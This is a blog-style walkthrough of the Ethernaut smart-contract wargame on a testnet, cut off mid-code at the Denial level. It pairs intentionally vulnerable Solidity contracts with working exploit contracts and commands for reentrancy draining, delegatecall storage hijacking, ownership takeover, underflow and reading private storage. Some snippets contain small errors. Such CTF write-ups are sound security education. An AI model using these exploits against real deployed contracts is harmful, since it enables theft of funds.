---
title: "Ethernaut succinct writeup. Where i got start"
date: 2023-10-12T00:00:00+08:00
---



Online game [Ethernaut](https://ethernaut.openzeppelin.com/), Using SepoliaETH from [mining faucet](https://sepolia-faucet.pk910.de/#/). My account address is `0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9`. I only use it for testnet for security. 

## Hello Ethernaut

Interact with contracts to complete challenges

```js
> await contract.info()
< 'You will find what you need in info1().'
> await contract.info1()
< 'You will find what you need in info2().'
> await contract.info2()
< 'The property infoNum holds the number of the next info method to call.'
> await contract.infoNum()
< {words: [42]}
> await contract.info42()
<'theMethodName is the name of the next method.'
> await contract.theMethodName()
< 'The method name is method7123949.'
> await contract.method7123949()
<'If you know the password, submit it to authenticate().'
> await contract.password()
<'ethernaut0'
> await contract.authenticate('ethernaut0')
```

solidity source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
```

## Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

There are two function could be used claim ownership of the contract. Since the original owner have 1000 wei in wallet, the function `contribute()`was hard to exploit. But requirement of `receive()`could easily be satisfied by using `contribute()`.

```js
// need to refer to the API documentation of web3.js https://web3js.readthedocs.io/en/v1.10.0/
> await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})
< {tx: '0x8868e98a26a35a88c57d2cadf24f40fb505a8b18b9bc047b9ca307fea4964068', receipt: {…}, logs: Array(0)}
> await sendTransaction({from: player, to: contract.address, value: toWei('0.00001')})
< '0x4f13c20bdb389b3901633d1665c466f48795f3e05f0a31e68f57135b512333e5'
> await contract.owner()
< '0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
> player
< '0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
> await contract.withdraw.sendTransaction()
< {tx: '0x0eea3783ce911fb2c7fda42b5f44f60b63c1b6f1e862a7e463bbd6469e592320', receipt: {…}, logs: Array(0)}
> await web3.eth.getBalance(contract.address)
< '0'
```

## Fallout

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

In early version of solidity, the function with the same name as the contract was used as the constructor. Wrong spelling of word `Fallout` causes `owner ` variable to be uninitialized and can be called externally for assignment. Reference https://docs.soliditylang.org/en/v0.8.21/050-breaking-changes.html#constructors

```js
> await contract.Fal1out.sendTransaction()
< {tx: '0xca9b301bac18f13c460eb71103e972efbe08bc07821a322945b947e629aa445d', receipt: {…}, logs: Array(0)}
> await contract.owner() == player
< true
```

## Coin Flip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

The target is to increase consistentWins to 10, which is the value of successfully guess the `side` variable ten times in a row.

Observing the generation logic of the side variable, easily know that this is a pseudo-random number generation method. This means that we can predict this result in the attacker's contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import './SafeMath.sol'; // https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
import './coinflip.sol'; // challenge source code

contract Attacker{

    using SafeMath for uint256;
    CoinFlip public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);
    }
    function guessFlip() public {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}
```

## Telephone

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

For claiming ownership of the contract, just need to make the values of `tx.origin` and `msg.sender` unequal. Reference to https://docs.soliditylang.org/en/v0.8.21/cheatsheet.html#block-and-transaction-properties, `msg.sender` would return address of sender of the message (current call) while `tx.origin` return the address of sender of the transaction (full call chain), which mean the `tx.origin` must be a `Externally Owned Account` and `msg.sender` could be a `contract account` used for indirect calls. 

Just deploy a contract for indirectly calling would satisfied the requirements.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract Attacker {
  Telephone _telephone;
  constructor(address _address) {
    _telephone = new Telephone(_address);
  }
  function IndirectlyCall() {
    _telephone.changeOwner(msg.sender);
  }
}
```

## Token

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

Easily noticed that the requirement `balances[msg.sender] - _value >= 0` doesn't use SafeMath.sol, leading to overflow vulnerability. It is because `balances[msg.sender]` and `_value` was all declared as `uint`, and the result of the calculation will still be uint.

To solve this challenge, we need another account to call the transfer. Because both EOA and CA are applicable, just modify the Attacker contract in the former challenge `Telephone`, this challenge can be solved.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Token.sol';

contract Attacker {
  Token _token;
  constructor(address _address) {
    _token = Token(_address);
  }
  function IndirectlyCall(address _address) public {
    _token.transfer(_address, 10000020);
  }
}
```

## Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

The target is to claim ownership of the contract instance. [delegatecall](https://solidity-by-example.org/delegatecall/) is low level function similar to `call`. but in the process of `delegatecall` , the function being called indirectly would using the calling function's memory and `msg.sender` `msg.value`. Therefore delegates have complete access to your contract's state. Referrence to https://www.wtf.academy/en/solidity-advanced/Delegatecall/

```solidity
contract.sendTransaction({data: web3.utils.keccak256("pwn()")})
```

## Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

It just a plain contract with none code inside. Even not have a `receive` or `fallback` function to recept money. 

Contracts can get money through the following methods:

- payable function ( customize / receive / fallback ) and external calling
- selfdestruct award
- mining award

Apparently in this contract we should call [selfdestruct](https://docs.soliditylang.org/en/v0.8.20/introduction-to-smart-contracts.html#deactivate-and-self-destruct) of other contract to force this contract recept money.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Sacrifice {

    function suicide(address payable _address) external payable {
    	selfdestruct(_address);
    }

    receive() external payable { }
}
```

deploy and call suicide function with value `10000 wei` would solve this challenge

## Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Just get the value of password would solve this challenge. Even though  password is declared as private, there is no real private variable in blockchain world. We are able to directly visit the memory of contract. Through easy calculation you would know the password is in the solt with index 1.

```js
> await web3.eth.getStorageAt(contract.address, 1)
< '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```

```bash
$ cast send 0x2aEB3659dae953F1E6479F1080293285575e4426 "unlock(bytes32)" -r https://ethereum-sepolia.publicnode.com --private-key <64byteskey> -- '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

blockHash               0xfd32fdacac580b386cfc23eb61e8c3f43e0fd53a933d0e7be00efe457be78173
blockNumber             4501800
contractAddress         
cumulativeGasUsed       1921303
effectiveGasPrice       10926752295
gasUsed                 24143
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1
transactionHash         0x4a381bd75ab79e4196104de62c5dc0453d18596260b83b7368ff1689b2d98a76
transactionIndex        14
type                    2
```

_Foundry Toolkit excellent_ 

the rpc url above found by https://chainlist.org/chain/11155111

## King

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

In this contract, we can become the new king by paying more than prize, while the owner can become the new king through his identity without paying.

In ethereum world, EOA can receive eth at any time, but if the CA haven't declared the payable function `receive()` or `fallback()`, or just actively  `revert()`, the transcation would failed. And it will cause a rollback of the Ethereum state machine with the below code not executed (That is to say, the value of the king variable can no longer be changed). That's what needed in solving this challenge.

check the current prize: 

```js
> await web3.eth.getStorageAt(contract.address, 1)
< '0x00000000000000000000000000000000000000000000000000038d7ea4c68000'
> (0x38d7ea4c68000).toString().length
< 16
```

deploy the following contract with `>=0.001 eth`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Newking{
    King _king;
    constructor(address payable _address) payable{
        _king = King(_address);
        address(_king).call{value: _king.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
    }
}
```

## Re-Entrance

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

Classic Reentrance-Attack.

In my understanding, Reentrance-Attack is similar to the race-condition attack in web2 application. Due to the contract operating mechanism of Ethereum, if the transaction address in the contract is another contract, the receive or fallback code of that contract will be executed first, and the state machine will not be updated at this moment. The back calling to this victim contract in receive function would bypass the state check.

```solidity
> await getBalance(contract.address)
< 0.001
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import './Reentrance.sol';

contract Reeentrance {

    Reentrance _reentrance;
    constructor (address payable _address) public payable {
        _reentrance = Reentrance(_address);
    }

    function attack () public payable {
        address(_reentrance).call{value: 100000000000000}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
        _reentrance.withdraw(100000000000000);
    }
    receive () external payable {
        if(address(_reentrance).balance > 0) _reentrance.withdraw(100000000000000);
    }
}
```

A word after solving the challenge.

> `transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

## Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Contract defined a interface `Building` and will be Instantiated when `goTo` function is called. 

Thats mean `msg.sender` should be CA, with `goTo` function meet the interface requirements. And to exploit it we should let `isLastFloor` return false at first, and true at second time.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

contract Hack {
  constructor(address _instance) {
    target = Elevator(_instance);
  }
  Elevator public target;
  bool result = true;
  function isLastFloor(uint) public returns (bool){
    if(result == true)
    {
      result = false;
    }
    else {
      result = true;
    }
    return result;
  }

  function attack() public {
    target.goTo(10);
  }
}
```

## Privacy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

Still, there is not real "private" variable in ethereum. Even the memory of contract could be view by given API of web3.js.

```solidity
> (await web3.eth.getStorageAt(contract.address, 5))
< '0x1603c85b3f007519d352444d1eee059b52fbf7c375579129a1903cead8e3ca82'
```

```bash
$ cast call 0x34a17DfF1f3CCde4d2948c58658993D9F0320050 "unlock(bytes16)" -r wss://ethereum-sepolia.publicnode.com --private-key <REDACTED> -- 0x1603c85b3f007519d352444d1eee059b -f
0x
```

~~I didn't know why it output `0x`. but it actually be worked.（x~~

## Gatekeeper One

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

This challenge need us to pass three check of modifier. 

- gateOne: just the previous challenge `Telephone`
- gateTwo: gas remaining required to be an integer multiple of 10. Brute force with some meaningless code could pass this.
- gateThree: three requirements to `_gateKey` param:
  - `_gateKey[4:7]` == `_gateKey[6:7]` (`_gate[4:5]` == `0x0000`)
  
  - `_gateKey[4:7]` != `_gateKey[0:7]`(`_gateKey[0:3]` != `0x00000000`)
  
  - `_gateKey[4:7]` == `tx.origin[28:29]`(`_gateKey[4:5]`== `0x0000` && `_gateKey[6:7]` == `tx.origin[28:29]`)
  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./chall/GatekeeperOne.sol";

contract exp {

    GatekeeperOne level13 = GatekeeperOne(0xF4F13D94A1c5A8e51DED1692171bC67260289E5E);

    function exploit() external{
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
```


_solidity changes so fast... only found 0.6.3 could compile this(with `Explicit type conversion` and `lower level call{}()` )_

## GateKeeper Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Still three modifier:

- gateOne: same with the former challenge
- gateTwo: caller's code size should be 0, and will be satisfied if calling in constructor.
- gateTree: `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)`, equivalent to `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)` and can be calculated in this way.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./chall/GateKeeperTwo.sol";

contract exp {
    address Instance;
    
    constructor(address _addr) {
      Instance = _addr;
      unchecked{
          bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max  );
          GatekeeperTwo(Instance).enter(key);
      }
    }
}
```

## naught coin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

This contract is inherited from [ERC20](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20) and overrided the function `transfer`.

Just have a view of official documents will find the function `approval` and `transferFrom`, which is exploitable.

```solidity
contract.approve(player,toWei("1000000"))
contract.transferFrom(player,contract.address,toWei("1000000"))
```

## Preservation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

https://learnblockchain.cn/article/5372: `delegateCall` stating variables are actually modified not by their names, but by their declared location in storage.

That is mean when delegateCall LibraryContract, `storedTime` was pointed to the address of `timeZone1Library` in Preservation's storage. Through that, we can change the timeZone1Library to our evil contract, and call `setFirstTime` again to trigger evil code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract exp {

  // stores a timestamp 
  uint holder1;
  uint holder2;
  address owner;

  function setTime(uint _time) public {
    holder1 = _time;
    owner = address(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9);
  }
}
```

```solidity
> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') //deployed exp contract address
> await web3.eth.getStorageAt(contract.address, 0)
< '0x00000000000000000000000012e47be67263af5939fe689a549c3e2a9110417f'
> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') //simply could be anything valid
```

## Recovery

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

Tracking the contract creation(Internal transcation) on etherscan would show the address of created token contract. Any note that `destroy` function was setted to be public, call this function could solve this challenge

```bash
$ cast send 0xe8b72c8696d6370bc1b0ba465477c3c3c650cde0 "destroy(address)" -r "https://1rpc.io/sepolia" --private-key <64bytesKey> -- '0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
```

>Contract addresses are deterministic and are calculated by `keccak256(address, nonce)` where the `address` is the address of the contract (or ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).
>
>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.
>
>An interesting [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.
>
>If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.

seems not intended... but the blog interesting exactly.

## MagicNumber

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

>To solve this level, you only need to provide the Ethernaut with a `Solver`, a contract that responds to `whatIsTheMeaningOfLife()` with the right number.
>
>Easy right? Well... there's a catch.
>
>The solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.
>
>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That's right: Raw EVM bytecode.
>
>Good luck!

write valid opcodes to implement the contract like following: (I found it on the internet somewhere)

 1. 0x60 - PUSH1 --> PUSH(0x2a) --> 0x602a (Pushing 2a or 42)

 2. 0x60 - PUSH1 --> PUSH(0x80) --> 0x6080 (Pushing an arbitrary selected memory slot 80)

 3. 0x52 - MSTORE --> MSTORE --> 0x52 (Store value p=0x2a at position v=0x80 in memory)

 4. 0x60 - PUSH1 --> PUSH(0x20) --> 0x6020 (Size of value is 32 bytes)

 5. 0x60 - PUSH1 --> PUSH(0x80) --> 0x6080 (Value was stored in slot 0x80)

 6. 0xf3 - RETURN --> RETURN --> 0xf3 (Return value at p=0x80 slot and of size s=0x20)

```solidity
// deploy it and get contractAddress
await web3.eth.sendTransaction({ from:player, data: '0x69602a60005260206000f3600052600a6016f3' });
// submit the solver contract
await contract.setSolver('0x5ba95745bb7ae5ac15ab9968e665ab761ca7b62f')
```

## Alien Codex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

When array declared, it will occupy a slot in memory like other type do as its length, and set a base address for the data area by following formula:

```
keccak(slot)
```

and the data will be store like:

```
codex[0] => (keccak(slot) + 0) % 2 ** 256
codex[1] => (keccak(slot) + 1) % 2 ** 256
...
codex[i] => (keccak(slot) + i) % 2 ** 256
```

thus we can override the data of owner to claim ownership.

```
&codex[i] == &owner
=> (keccak(length_slot) + i) % 2 ** 256 == 0
=> (keccak(length_slot) + i) == 2 ** 256
=> i == 2 ** 256 - keccak(length_slot)
+ length_slot = 1
=> i == 2 ** 256 - keccak(1)
```

In addition, it should be noted that the array value will be determined according to the length range, so it is necessary to cause the length variable to underflow first.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract exp {
    IAlienCodex Instance;

    constructor(address _addr) {
      Instance = IAlienCodex(_addr);
    }

    function attack() public {
        unchecked{
            Instance.makeContact();
            Instance.retract();
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            Instance.revise(index, bytes32(uint256(uint160(tx.origin))));
        }
    }

}
```

## Denial

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

To complete this level, we need prevent the  owner from withdrawing funds when they call `withdraw()`. that's mean we should revert the tx in `withdraw` function calling process. After trying it, I found that contracts without payable will not cause revert. But we can cause gas exhaustion through an infinite loop, thus preventing the transaction from continuing.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract exp{
